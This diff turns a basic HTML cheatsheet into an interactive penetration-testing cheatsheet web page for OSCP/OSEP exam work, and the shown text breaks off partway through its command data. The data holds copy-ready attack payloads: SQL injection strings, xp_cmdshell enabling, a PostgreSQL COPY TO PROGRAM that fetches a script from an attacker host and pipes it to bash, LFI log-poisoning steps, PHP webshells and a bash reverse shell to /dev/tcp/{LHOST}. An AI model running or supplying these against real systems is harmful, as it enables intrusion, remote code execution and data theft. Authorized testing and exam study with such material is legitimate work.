@@ -1,62 +1,1603 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HTML Cheatsheet</title>
-    <style>
-        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 20px; }
-        h1, h2, h3, h4, h5, h6 { color: #333; }
-        pre { background: #f4f4f4; padding: 10px; border: 1px solid #ddd; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP+ / OSEP Advanced Cheatsheet v3</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#141824;--bg2:#1c2133;--bg3:#222840;--bg4:#28304c;--border:#313a58;--border2:#46527a;--text:#e8edf5;--text2:#a8b4cc;--text3:#7080a0;--accent:#4d9ef6;--accent2:#93d3fc;--green:#22c55e;--red:#ef4444;--orange:#f59e0b;--purple:#b39dfc;--teal:#2dd4bf;--pink:#f472b6;--code:#b8f0fc;--sidebar-w:210px}
+body{font-family:system-ui,-apple-system,sans-serif;font-size:13px;background:var(--bg);color:var(--text);height:100vh;overflow:hidden;display:flex;flex-direction:column}
+/* Header */
+.hdr{background:var(--bg2);border-bottom:1px solid var(--border);padding:0 16px;height:50px;display:flex;align-items:center;gap:12px;flex-shrink:0}
+.hdr-title{font-size:15px;font-weight:700;color:var(--accent2);white-space:nowrap}
+.hdr-badge{font-size:10px;padding:2px 7px;border-radius:10px;background:#1e3a5f;color:var(--accent2);font-weight:600}
+.search-wrap{flex:1;max-width:380px;position:relative}
+.search-icon{position:absolute;left:10px;top:50%;transform:translateY(-50%);color:var(--text3);font-size:13px}
+#searchInput{width:100%;padding:7px 10px 7px 30px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none}
+#searchInput:focus{border-color:var(--accent)}
+#searchInput::placeholder{color:var(--text3)}
+.hdr-right{display:flex;align-items:center;gap:8px;margin-left:auto}
+.hdr-btn{padding:5px 10px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text2);font-size:11px;cursor:pointer;transition:all .15s}
+.hdr-btn:hover{border-color:var(--accent);color:var(--accent2)}
+.hdr-btn.active{background:#1e3a5f;border-color:var(--accent);color:var(--accent2)}
+.warn-badge{font-size:10px;padding:3px 9px;background:#1c1204;border:1px solid #78350f;border-radius:6px;color:var(--orange);white-space:nowrap}
+/* Vars bar */
+.vars-bar{background:var(--bg2);border-bottom:1px solid var(--border);padding:7px 16px;display:flex;flex-wrap:wrap;gap:6px;align-items:center;flex-shrink:0}
+.vars-lbl{font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.6px;color:var(--text3);width:100%;margin-bottom:1px}
+.vg{display:flex;align-items:center;gap:4px}
+.vl{font-size:10.5px;color:var(--text3);white-space:nowrap}
+.vi{font-family:'Courier New',monospace;font-size:11.5px;padding:3px 8px;border:1px solid var(--border);border-radius:5px;background:var(--bg3);color:var(--accent2);min-width:80px;outline:none;transition:border-color .15s}
+.vi:focus{border-color:var(--accent)}
+/* Layout */
+.body{display:flex;flex:1;overflow:hidden}
+/* Sidebar */
+.sidebar{width:var(--sidebar-w);min-width:var(--sidebar-w);background:var(--bg2);border-right:1px solid var(--border);overflow-y:auto;flex-shrink:0}
+.sg{font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;color:var(--text3);padding:10px 12px 3px}
+.si{padding:6px 12px;cursor:pointer;font-size:12px;color:var(--text2);border-left:2px solid transparent;transition:all .1s;display:flex;align-items:center;gap:5px}
+.si:hover{background:var(--bg3);color:var(--text)}
+.si.on{border-left-color:var(--accent);color:var(--accent2);background:var(--bg3);font-weight:500}
+.si .cnt{margin-left:auto;font-size:10px;background:var(--bg4);color:var(--text3);padding:1px 5px;border-radius:8px}
+.si.on .cnt{background:#1e3a5f;color:var(--accent2)}
+/* Main content */
+.main{flex:1;overflow-y:auto;padding:14px 18px}
+.sec{display:none}
+.sec.on{display:block}
+.sec-hdr{display:flex;align-items:baseline;gap:10px;margin-bottom:3px}
+.sec-title{font-size:17px;font-weight:600;color:var(--text)}
+.sec-sub{font-size:11px;color:var(--text3);margin-bottom:14px}
+.grp{margin-bottom:18px}
+.grp-title{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--text3);padding-bottom:5px;border-bottom:1px solid var(--border);margin-bottom:7px;display:flex;align-items:center;gap:6px;cursor:pointer;user-select:none}
+.grp-title:hover{color:var(--text2)}
+.grp-title .collapse-icon{margin-left:auto;font-size:10px;transition:transform .2s;flex-shrink:0}
+.grp-title.collapsed .collapse-icon{transform:rotate(-90deg)}
+.grp-body{overflow:hidden;transition:max-height .2s ease}
+.grp-body.collapsed{display:none}
+.grp-progress{height:2px;background:var(--border);border-radius:2px;margin-bottom:7px;overflow:hidden}
+.grp-progress-bar{height:100%;background:var(--green);border-radius:2px;transition:width .3s;width:0}
+/* Command row */
+.row{display:flex;align-items:flex-start;gap:7px;margin-bottom:4px;padding:8px 10px;border:1px solid var(--border);border-radius:8px;background:var(--bg2);transition:border-color .12s,background .12s;position:relative}
+.row:hover{border-color:var(--border2);background:var(--bg3)}
+.row.fav-row{border-left:2px solid var(--orange)}
+.row.done-row{opacity:.5;border-left:2px solid var(--green) !important}
+.row.done-row .rc{text-decoration:line-through;color:var(--text3)}
+.ri{flex:1;min-width:0}
+.rd{font-size:10.5px;color:var(--text3);margin-bottom:3px;display:flex;align-items:center;gap:5px}
+.tag{font-size:9px;padding:1px 5px;border-radius:8px;font-weight:600}
+.tag-crit{background:#2d0a0a;color:#fca5a5}
+.tag-high{background:#2d1a0a;color:#fcd34d}
+.tag-med{background:#0a1a0a;color:#86efac}
+.tag-osep{background:#1a0a2d;color:#c4b5fd}
+.tag-new{background:#0a1f2d;color:var(--accent2)}
+.rc{font-family:'Courier New',monospace;font-size:12px;line-height:1.75;white-space:pre-wrap;word-break:break-all;color:var(--code)}
+.row-actions{display:flex;flex-direction:column;gap:3px;flex-shrink:0}
+.cp{padding:3px 8px;font-size:10px;border:1px solid var(--border);border-radius:5px;cursor:pointer;background:transparent;color:var(--text3);font-family:inherit;transition:all .12s;white-space:nowrap}
+.cp:hover{border-color:var(--accent);color:var(--accent2)}
+.cp.ok{border-color:var(--green);color:var(--green)}
+.fav-btn{padding:3px 6px;font-size:11px;border:1px solid var(--border);border-radius:5px;cursor:pointer;background:transparent;color:var(--text3);font-family:inherit;transition:all .12s}
+.fav-btn:hover{border-color:var(--orange);color:var(--orange)}
+.fav-btn.on{color:var(--orange);border-color:var(--orange)}
+.note-btn{padding:3px 6px;font-size:11px;border:1px solid var(--border);border-radius:5px;cursor:pointer;background:transparent;color:var(--text3);font-family:inherit}
+.note-btn:hover{border-color:var(--purple);color:var(--purple)}
+.note-btn.has-note{color:var(--purple);border-color:var(--purple)}
+.done-btn{padding:3px 6px;font-size:11px;border:1px solid var(--border);border-radius:5px;cursor:pointer;background:transparent;color:var(--text3);font-family:inherit;transition:all .12s}
+.done-btn:hover{border-color:var(--green);color:var(--green)}
+.done-btn.on{color:var(--green);border-color:var(--green);background:rgba(34,197,94,.08)}
+/* Note input */
+.note-area{width:100%;margin-top:5px;padding:5px 8px;background:var(--bg4);border:1px solid var(--border);border-radius:5px;color:var(--text2);font-size:11px;font-family:inherit;resize:vertical;min-height:40px;outline:none}
+.note-area:focus{border-color:var(--purple)}
+.note-display{margin-top:4px;padding:4px 8px;background:#1a0a2d;border:1px solid #3b2d5a;border-radius:5px;font-size:11px;color:var(--purple);font-style:italic}
+/* Search results */
+#searchResults{display:none}
+#searchResults.on{display:block}
+.sr-count{font-size:12px;color:var(--text3);margin-bottom:10px}
+.sr-count span{color:var(--accent2);font-weight:600}
+/* Stats bar */
+.stats-bar{display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap}
+.stat-pill{padding:3px 10px;border-radius:12px;font-size:11px;background:var(--bg3);border:1px solid var(--border);color:var(--text2)}
+.stat-pill span{color:var(--accent2);font-weight:600}
+/* Favorites panel */
+#favPanel{display:none;position:fixed;top:0;right:0;width:380px;height:100vh;background:var(--bg2);border-left:1px solid var(--border);z-index:200;overflow-y:auto;padding:16px}
+#favPanel.on{display:block}
+.fav-panel-hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
+.fav-panel-title{font-size:14px;font-weight:600;color:var(--orange)}
+.close-btn{padding:4px 10px;background:var(--bg3);border:1px solid var(--border);border-radius:5px;color:var(--text2);cursor:pointer;font-family:inherit;font-size:11px}
+.close-btn:hover{border-color:var(--red);color:var(--red)}
+/* Notes panel */
+#notesPanel{display:none;position:fixed;bottom:0;left:var(--sidebar-w);right:0;height:200px;background:var(--bg2);border-top:1px solid var(--purple);z-index:150;padding:12px 18px;overflow-y:auto}
+#notesPanel.on{display:block}
+/* History */
+.hist-item{font-family:'Courier New',monospace;font-size:11px;padding:5px 8px;background:var(--bg3);border-radius:5px;margin-bottom:4px;color:var(--text2);display:flex;align-items:flex-start;gap:8px;border:1px solid var(--border)}
+.hist-time{color:var(--text3);white-space:nowrap;font-size:10px}
+/* Scrollbar */
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+/* Highlight match */
+.hl{background:#2a2000;color:#fde68a;border-radius:2px}
+/* Empty state */
+.empty{text-align:center;padding:40px 20px;color:var(--text3)}
+.empty-icon{font-size:32px;margin-bottom:8px}
+/* Custom command modal */
+#customModal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:500;align-items:center;justify-content:center}
+#customModal.on{display:flex}
+.modal-box{background:var(--bg2);border:1px solid var(--border2);border-radius:12px;padding:22px 24px;width:520px;max-width:95vw;max-height:90vh;overflow-y:auto;box-shadow:0 8px 40px rgba(0,0,0,.6)}
+.modal-title{font-size:14px;font-weight:700;color:var(--accent2);margin-bottom:16px;display:flex;align-items:center;gap:8px}
+.mf{margin-bottom:12px}
+.mf label{display:block;font-size:10.5px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px}
+.mf input,.mf textarea,.mf select{width:100%;padding:7px 10px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text);font-size:12px;font-family:'Courier New',monospace;outline:none;transition:border-color .15s}
+.mf input.mf-text{font-family:inherit}
+.mf input:focus,.mf textarea:focus,.mf select:focus{border-color:var(--accent)}
+.mf textarea{resize:vertical;min-height:80px;line-height:1.6}
+.mf select{font-family:inherit;cursor:pointer}
+.tag-checks{display:flex;gap:8px;flex-wrap:wrap}
+.tag-chk{display:flex;align-items:center;gap:4px;font-size:11px;color:var(--text2);cursor:pointer;padding:3px 8px;border:1px solid var(--border);border-radius:6px;background:var(--bg3);user-select:none}
+.modal-actions{display:flex;gap:8px;margin-top:16px;justify-content:flex-end}
+.btn-save{padding:7px 18px;background:var(--accent);border:none;border-radius:6px;color:#fff;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;transition:opacity .15s}
+.btn-save:hover{opacity:.85}
+.btn-cancel{padding:7px 14px;background:transparent;border:1px solid var(--border);border-radius:6px;color:var(--text2);font-size:12px;cursor:pointer;font-family:inherit}
+.btn-cancel:hover{border-color:var(--red);color:var(--red)}
+.del-btn{padding:2px 7px;font-size:10px;border:1px solid var(--border);border-radius:4px;cursor:pointer;background:transparent;color:var(--text3);font-family:inherit;transition:all .12s;margin-left:2px}
+.del-btn:hover{border-color:var(--red);color:var(--red)}
+.edit-btn{padding:2px 7px;font-size:10px;border:1px solid var(--border);border-radius:4px;cursor:pointer;background:transparent;color:var(--text3);font-family:inherit;transition:all .12s}
+.edit-btn:hover{border-color:var(--teal);color:var(--teal)}
+.custom-badge{font-size:9px;padding:1px 5px;border-radius:8px;background:#0a1f1f;color:var(--teal);font-weight:600;border:1px solid var(--teal);margin-left:4px}
+.hdr-btn.custom-btn{border-color:var(--teal);color:var(--teal)}
+.hdr-btn.custom-btn:hover{background:#0a1a1a}
+/* Keyboard shortcut panel */
+#shortcutPanel{display:none;position:fixed;top:58px;right:12px;width:280px;background:var(--bg2);border:1px solid var(--border2);border-radius:10px;z-index:300;padding:14px 16px;box-shadow:0 8px 32px rgba(0,0,0,.5)}
+#shortcutPanel.on{display:block}
+.sc-row{display:flex;justify-content:space-between;align-items:center;padding:4px 0;border-bottom:1px solid var(--border);font-size:11px}
+.sc-row:last-child{border-bottom:none}
+.sc-key{font-family:'Courier New',monospace;background:var(--bg4);color:var(--accent2);padding:1px 6px;border-radius:4px;font-size:10px;border:1px solid var(--border2)}
+.sc-desc{color:var(--text2)}
+/* Section export button */
+.sec-export{padding:4px 10px;font-size:10px;border:1px solid var(--border);border-radius:5px;cursor:pointer;background:transparent;color:var(--text3);font-family:inherit;transition:all .12s;margin-left:auto}
+.sec-export:hover{border-color:var(--teal);color:var(--teal)}
+/* Session timer */
+.session-timer{font-size:10px;color:var(--text3);font-family:'Courier New',monospace;padding:3px 8px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;white-space:nowrap}
+/* Jump to top button */
+#jumpTop{display:none;position:fixed;bottom:20px;right:20px;width:36px;height:36px;background:var(--accent);border:none;border-radius:50%;color:#fff;font-size:16px;cursor:pointer;z-index:400;box-shadow:0 4px 12px rgba(0,0,0,.4);transition:all .2s}
+#jumpTop:hover{transform:translateY(-2px);box-shadow:0 6px 18px rgba(0,0,0,.5)}
+#jumpTop.on{display:flex;align-items:center;justify-content:center}
+/* Pinned note */
+.pin-note{font-size:10.5px;padding:5px 10px;background:#1a102a;border:1px solid var(--purple);border-radius:6px;color:var(--purple);margin-bottom:10px;display:flex;align-items:flex-start;gap:6px}
+.pin-note .pn-del{margin-left:auto;cursor:pointer;opacity:.6;flex-shrink:0}
+.pin-note .pn-del:hover{opacity:1}
+/* tag-custom */
+.tag-custom{background:#051f1f;color:var(--teal);border:1px solid var(--teal)}
+</style>
 </head>
 <body>
-    <h1>HTML Cheatsheet</h1>
-    <h2>Basic Structure</h2>
-    <pre>&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-  &lt;head&gt;
-    &lt;meta charset=&quot;UTF-8&quot;&gt;
-    &lt;title&gt;Document Title&lt;/title&gt;
-  &lt;/head&gt;
-  &lt;body&gt;
-    &lt;h1&gt;Hello, World!&lt;/h1&gt;
-  &lt;/body&gt;
-&lt;/html&gt;</pre>
-    <h2>Common Tags</h2>
-    <h3>Headings</h3>
-    <pre>&lt;h1&gt;Heading 1&lt;/h1&gt;
-&lt;h2&gt;Heading 2&lt;/h2&gt;
-&lt;h3&gt;Heading 3&lt;/h3&gt;</pre>
-    <h3>Paragraphs</h3>
-    <pre>&lt;p&gt;This is a paragraph.&lt;/p&gt;</pre>
-    <h3>Links</h3>
-    <pre>&lt;a href=&quot;https://example.com&quot;&gt;This is a link&lt;/a&gt;</pre>
-    <h3>Images</h3>
-    <pre>&lt;img src=&quot;image.jpg&quot; alt=&quot;Image Description&quot;&gt;</pre>
-    <h3>Lists</h3>
-    <pre>&lt;ul&gt;
-  &lt;li&gt;Item 1&lt;/li&gt;
-  &lt;li&gt;Item 2&lt;/li&gt;
-&lt;/ul&gt;</pre>
-    <h2>Forms</h2>
-    <pre>&lt;form action=&quot;/submit&quot; method=&quot;post&quot;&gt;
-  &lt;input type=&quot;text&quot; name=&quot;name&quot; placeholder=&quot;Your Name&quot;&gt;
-  &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
-&lt;/form&gt;</pre>
-    <h2>Semantic HTML</h2>
-    <pre>&lt;header&gt;Header Content&lt;/header&gt;
-&lt;nav&gt;Navigation Links&lt;/nav&gt;
-&lt;main&gt;Main Content&lt;/main&gt;
-&lt;footer&gt;Footer Content&lt;/footer&gt;</pre>
-    <h2>Other Tags</h2>
-    <pre>&lt;div&gt;Division&lt;/div&gt;
-&lt;span&gt;Inline Element&lt;/span&gt;
-&lt;table&gt;
-  &lt;tr&gt;
-    &lt;th&gt;Header&lt;/th&gt;
-    &lt;td&gt;Data&lt;/td&gt;
-  &lt;/tr&gt;
-&lt;/table&gt;</pre>
+
+<!-- Header -->
+<div class="hdr">
+  <div class="hdr-title">OSCP+ / OSEP</div>
+  <div class="hdr-badge">v3.2 Advanced</div>
+  <div class="search-wrap">
+    <span class="search-icon">⌕</span>
+    <input id="searchInput" placeholder="Search commands, attacks, tools... (Ctrl+K)" autocomplete="off">
+  </div>
+  <div class="hdr-right">
+    <span class="session-timer" id="sessionTimer" title="Session time">⏱ 00:00</span>
+    <button class="hdr-btn custom-btn" onclick="openCustomModal()">➕ Add Command</button>
+    <button class="hdr-btn" onclick="toggleFav()">⭐ Favorites <span id="favCount">0</span></button>
+    <button class="hdr-btn" onclick="toggleHistory()">⏱ History</button>
+    <button class="hdr-btn" onclick="exportFavs()">⬇ Export Favs</button>
+    <button class="hdr-btn" onclick="toggleShortcuts()" title="Keyboard Shortcuts">⌨</button>
+    <div class="warn-badge">⚠ Authorized Use Only</div>
+  </div>
+</div>
+
+<!-- Variables -->
+<div class="vars-bar">
+  <div class="vars-lbl">Variables — auto-apply in all commands</div>
+  <div class="vg"><span class="vl">LHOST</span><input class="vi" id="lhost" value="10.10.14.1"></div>
+  <div class="vg"><span class="vl">RHOST</span><input class="vi" id="rhost" value="10.10.10.10"></div>
+  <div class="vg"><span class="vl">LPORT</span><input class="vi" id="lport" value="4444" style="min-width:60px"></div>
+  <div class="vg"><span class="vl">RPORT</span><input class="vi" id="rport" value="9001" style="min-width:60px"></div>
+  <div class="vg"><span class="vl">Domain</span><input class="vi" id="domain" value="corp.local" style="min-width:105px"></div>
+  <div class="vg"><span class="vl">DC IP</span><input class="vi" id="dc" value="192.168.1.10"></div>
+  <div class="vg"><span class="vl">User</span><input class="vi" id="user" value="john" style="min-width:70px"></div>
+  <div class="vg"><span class="vl">Pass</span><input class="vi" id="pass" value="Password123" style="min-width:115px"></div>
+  <div class="vg"><span class="vl">Hash (NT)</span><input class="vi" id="hash" value="NTLM_HASH_HERE" style="min-width:135px"></div>
+  <div class="vg"><span class="vl">Target URL</span><input class="vi" id="url" value="http://10.10.10.10" style="min-width:135px"></div>
+</div>
+
+<!-- Body -->
+<div class="body">
+  <div class="sidebar" id="sidebar"></div>
+  <div class="main" id="main">
+    <div id="searchResults"></div>
+    <div id="sections"></div>
+  </div>
+</div>
+
+<!-- Favorites Panel -->
+<div id="favPanel">
+  <div class="fav-panel-hdr">
+    <div class="fav-panel-title">⭐ Saved Favorites</div>
+    <div style="display:flex;gap:6px">
+      <button class="close-btn" onclick="clearAllFavs()">Clear All</button>
+      <button class="close-btn" onclick="toggleFav()">Close ✕</button>
+    </div>
+  </div>
+  <div id="favList"><div class="empty"><div class="empty-icon">⭐</div>No favorites yet.<br>Star commands to save them here.</div></div>
+</div>
+
+<!-- History Panel -->
+<div id="histPanel" style="display:none;position:fixed;bottom:0;left:var(--sidebar-w);right:0;height:180px;background:var(--bg2);border-top:1px solid var(--border2);z-index:150;padding:10px 18px;overflow-y:auto">
+  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
+    <span style="font-size:12px;font-weight:600;color:var(--text2)">⏱ Copy History (last 20)</span>
+    <div style="display:flex;gap:6px">
+      <button class="close-btn" onclick="clearHistory()">Clear</button>
+      <button class="close-btn" onclick="toggleHistory()">Close ✕</button>
+    </div>
+  </div>
+  <div id="histList"><div style="color:var(--text3);font-size:11px">No history yet. Copy some commands!</div></div>
+</div>
+
+<!-- Keyboard Shortcuts Panel -->
+<div id="shortcutPanel">
+  <div style="font-size:12px;font-weight:700;color:var(--accent2);margin-bottom:10px">⌨ Keyboard Shortcuts</div>
+  <div class="sc-row"><span class="sc-desc">Focus search</span><kbd class="sc-key">Ctrl+K</kbd></div>
+  <div class="sc-row"><span class="sc-desc">Clear search</span><kbd class="sc-key">Esc</kbd></div>
+  <div class="sc-row"><span class="sc-desc">Next section</span><kbd class="sc-key">Ctrl+→</kbd></div>
+  <div class="sc-row"><span class="sc-desc">Prev section</span><kbd class="sc-key">Ctrl+←</kbd></div>
+  <div class="sc-row"><span class="sc-desc">Add command</span><kbd class="sc-key">Ctrl+Shift+A</kbd></div>
+  <div class="sc-row"><span class="sc-desc">Toggle favorites</span><kbd class="sc-key">Ctrl+F</kbd></div>
+  <div class="sc-row"><span class="sc-desc">Close panels</span><kbd class="sc-key">Esc</kbd></div>
+</div>
+
+<!-- Jump to top -->
+<button id="jumpTop" onclick="document.querySelector('.main').scrollTo({top:0,behavior:'smooth'})" title="Back to top">↑</button>
+
+<!-- Custom Command Modal -->
+<div id="customModal">
+  <div class="modal-box">
+    <div class="modal-title">⚙ <span id="modalTitleText">Add Custom Command</span></div>
+    <input type="hidden" id="editingId">
+    <div class="mf">
+      <label>Command Name / Title</label>
+      <input class="mf-text" id="cmdName" placeholder="e.g. My Reverse Shell" style="font-family:inherit">
+    </div>
+    <div class="mf">
+      <label>Category (Group)</label>
+      <select id="cmdCategory">
+        <option value="custom">My Commands</option>
+        <option value="recon">Recon</option>
+        <option value="web">Web Attacks</option>
+        <option value="api">API Attacks</option>
+        <option value="shells">Shells</option>
+        <option value="lpe">Linux PrivEsc</option>
+        <option value="wpe">Windows PrivEsc</option>
+        <option value="adrecon">AD Recon</option>
+        <option value="adatk">AD Attacks</option>
+        <option value="adlat">AD Lateral</option>
+        <option value="adpst">Persistence</option>
+        <option value="evasion">Evasion / OPSEC</option>
+        <option value="inject">Injection</option>
+        <option value="c2">C2 Frameworks</option>
+        <option value="tunnel">Tunneling</option>
+        <option value="transfer">File Transfer</option>
+        <option value="crack">Hash Cracking</option>
+        <option value="misc">Misc / Snippets</option>
+      </select>
+    </div>
+    <div class="mf">
+      <label>Command — use {LHOST}, {RHOST}, {LPORT}, {RPORT}, {DOMAIN}, {DC}, {USER}, {PASS}, {HASH}, {URL}</label>
+      <textarea id="cmdBody" placeholder="e.g. nc -nlvp {LPORT}"></textarea>
+    </div>
+    <div class="mf">
+      <label>Tags</label>
+      <div class="tag-checks">
+        <label class="tag-chk"><input type="checkbox" id="t_crit" value="crit"> 🔴 Critical</label>
+        <label class="tag-chk"><input type="checkbox" id="t_high" value="high"> 🟡 High</label>
+        <label class="tag-chk"><input type="checkbox" id="t_med" value="med"> 🟢 Medium</label>
+        <label class="tag-chk"><input type="checkbox" id="t_osep" value="osep"> 💜 OSEP</label>
+        <label class="tag-chk"><input type="checkbox" id="t_new" value="new"> 🔵 New</label>
+      </div>
+    </div>
+    <div class="modal-actions">
+      <button class="btn-cancel" onclick="closeCustomModal()">Cancel</button>
+      <button class="btn-save" onclick="saveCustomCommand()">Save Command</button>
+    </div>
+  </div>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════
+// DATA
+// ═══════════════════════════════════════════════════════════
+const D = [
+// ─── RECON ──────────────────────────────────────────────────
+{id:"recon",label:"Recon",icon:"🔍",group:"OSCP+ Core",groups:[
+{t:"Host & Network Discovery",c:[
+["Ping sweep","nmap -sn {LHOST}/24 --min-rate 1000 -oG hosts.txt"],
+["ARP scan (no ICMP)","arp-scan -l"],
+["Rustscan → nmap pipe","rustscan -a {RHOST} --ulimit 5000 -- -sV -sC"],
+["Full TCP all ports (fast)","nmap -sV -sC -p- --min-rate 5000 -oA full_{RHOST} {RHOST}"],
+["Quick top 1000","nmap -sV -sC -oA quick_{RHOST} {RHOST}"],
+["UDP scan (top 20)","nmap -sU --top-ports 20 {RHOST}"],
+["OS detection","nmap -O --osscan-guess {RHOST}"],
+["Aggressive + all scripts","nmap -A -T4 -oA aggro_{RHOST} {RHOST}"],
+["Vuln scripts","nmap --script vuln -oA vuln_{RHOST} {RHOST}"],
+["SMB vuln + enum","nmap --script smb-enum-shares,smb-enum-users,smb-vuln* -p 445 {RHOST}"],
+]},
+{t:"Service Enumeration",c:[
+["FTP — anonymous login","ftp {RHOST}\n# Username: anonymous  Password: (blank)"],
+["FTP — nmap scripts","nmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 {RHOST}"],
+["SMB — list shares","smbclient -L //{RHOST} -N"],
+["SMB — connect share","smbclient //{RHOST}/Share -U {USER}%{PASS}"],
+["SMB — full enum","enum4linux -a {RHOST}"],
+["SMB — signing check","crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt"],
+["SNMP — walk","snmpwalk -c public -v1 {RHOST}"],
+["SNMP — brute community","onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {RHOST}"],
+["LDAP — anonymous","ldapsearch -x -H ldap://{RHOST} -b 'dc=corp,dc=local'"],
+["NFS — showmount","showmount -e {RHOST}"],
+["DNS — zone transfer","dig axfr @{RHOST} {DOMAIN}"],
+["rpcclient — null session","rpcclient -U '' -N {RHOST}"],
+["SMTP — user enum","smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {RHOST}"],
+["MSSQL — enum","nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password -p 1433 {RHOST}"],
+["Redis — info","redis-cli -h {RHOST} info"],
+["MongoDB — dump","mongodump --host {RHOST} --out /tmp/mongodump"],
+["Elasticsearch","curl -s http://{RHOST}:9200/_cat/indices"],
+]},
+{t:"Web Enumeration",c:[
+["Gobuster dir","gobuster dir -u {URL} -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,js,json -t 50"],
+["Gobuster vhost","gobuster vhost -u {URL} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain"],
+["Feroxbuster recursive","feroxbuster -u {URL} -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,js --depth 3"],
+["ffuf dir","ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u {URL}/FUZZ -mc 200,301,302,403 -o ffuf_out.json"],
+["ffuf vhost","ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u {URL} -H 'Host: FUZZ.{DOMAIN}' -fc 302,404"],
+["ffuf param","ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u '{URL}/page.php?FUZZ=test' -mc 200,302"],
+["Nikto","nikto -h {URL}"],
+["CeWL wordlist","cewl {URL} -d 3 -m 6 -w cewl_words.txt"],
+["WhatWeb fingerprint","whatweb {URL} -v"],
+]},
+]},
+// ─── WEB ATTACKS ────────────────────────────────────────────
+{id:"web",label:"Web Attacks",icon:"🌐",group:"OSCP+ Core",groups:[
+{t:"SQL Injection",c:[
+["SQLmap GET","sqlmap -u '{URL}/page.php?id=1' --dbs --batch"],
+["SQLmap POST","sqlmap -u '{URL}/login.php' --data='user=admin&pass=test' --dbs --batch",["high"]],
+["SQLmap dump table","sqlmap -u '{URL}/page.php?id=1' -D dbname -T users --dump --batch"],
+["SQLmap OS shell","sqlmap -u '{URL}/page.php?id=1' --os-shell --batch",["crit"]],
+["SQLmap from Burp request","sqlmap -r request.txt --dbs --batch"],
+["SQLmap cookie","sqlmap -u '{URL}/' --cookie='session=abc123' --level 3 --risk 2 --dbs --batch"],
+["UNION — detect columns","' ORDER BY 1-- -\n' ORDER BY 2-- -\n' UNION SELECT NULL-- -\n' UNION SELECT NULL,NULL-- -"],
+["UNION — MySQL version","' UNION SELECT version(),NULL,NULL-- -"],
+["Error-based MySQL","' AND extractvalue(1,concat(0x7e,version()))-- -"],
+["Time-based blind","' AND SLEEP(5)-- -\n\" AND SLEEP(5)-- -"],
+["Boolean blind","' AND 1=1-- -   (true)\n' AND 1=2-- -   (false)"],
+["MSSQL — xp_cmdshell","'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -\n'; EXEC xp_cmdshell('whoami');-- -"],
+["MSSQL — stacked queries","'; INSERT INTO users(name,pass) VALUES('hax','hax');-- -"],
+["PostgreSQL — copy to/from","'; COPY (SELECT '') TO PROGRAM 'curl http://{LHOST}/shell.sh|bash';-- -",["crit"]],
+]},
+{t:"LFI / Path Traversal",c:[
+["Basic LFI","{URL}/page.php?file=../../../../etc/passwd"],
+["Null byte (PHP < 5.3)","{URL}/page.php?file=../../../../etc/passwd%00"],
+["PHP filter — read source","{URL}/page.php?file=php://filter/convert.base64-encode/resource=index.php"],
+["PHP expect — RCE","{URL}/page.php?file=expect://id"],
+["LFI — /proc/self/environ","{URL}/page.php?file=/proc/self/environ&HTTP_USER_AGENT=<?php system($_GET['c']); ?>"],
+["Apache log poison","# Step 1: nc {RHOST} 80  then send: GET /<?php system($_GET['c']); ?> HTTP/1.1\n# Step 2: {URL}/page.php?file=/var/log/apache2/access.log&c=id"],
+["SSH log poison","ssh '<?php system($_GET[\"c\"]); ?>'@{RHOST}\n# Then: {URL}/page.php?file=/var/log/auth.log&c=whoami"],
+["Windows path traversal","{URL}/page.php?file=..\\..\\..\\windows\\win.ini\n{URL}/page.php?file=../../../../windows/system32/drivers/etc/hosts"],
+["LFI2RCE via zip://","{URL}/page.php?file=zip:///tmp/file.zip%23shell.php"],
+["LFI2RCE via phar://","# Create: echo '<?php system($_GET[\"c\"]); ?>' > shell.php; zip shell.zip shell.php; mv shell.zip shell.jpg\n# Access: {URL}/page.php?file=phar:///uploads/shell.jpg%2Fshell.php&c=id"],
+]},
+{t:"File Upload Bypass",c:[
+["PHP webshell","<?php echo system($_GET['cmd']); ?>"],
+["PHP short tag","<?= system($_GET['c']); ?>"],
+["PHP7 webshell","<?php echo shell_exec($_GET['e'].' 2>&1'); ?>"],
+["PHP reverse shell upload","<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"'); ?>"],
